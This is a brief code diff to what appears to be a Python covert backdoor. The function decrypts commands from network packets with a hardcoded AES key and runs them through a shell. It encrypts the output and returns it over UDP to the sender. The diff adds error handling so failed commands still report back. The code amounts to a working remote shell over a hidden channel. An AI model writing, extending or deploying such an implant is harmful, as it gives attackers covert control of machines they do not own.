@@ -31,7 +31,11 @@ def runCommand(packet):
   decryptionObject = AES.new('This is a key123', AES.MODE_CFB, 'This is an IV456')
   data = crypto.decrypt(encryptedData)
   print "Running command " + data
-  output = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT)
+  output = ""
+  try:
+    output = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT)
+  except subprocess.CalledProcessError as e:
+    output = e.output
   encryptedOutput = crypto.encrypt(output)
   packet = IP(dst=packet[0][1].src)/UDP(dport=int(args.sourcePort), sport=int(args.destPort))/Raw(load=encryptedOutput)
   time.sleep(0.1)
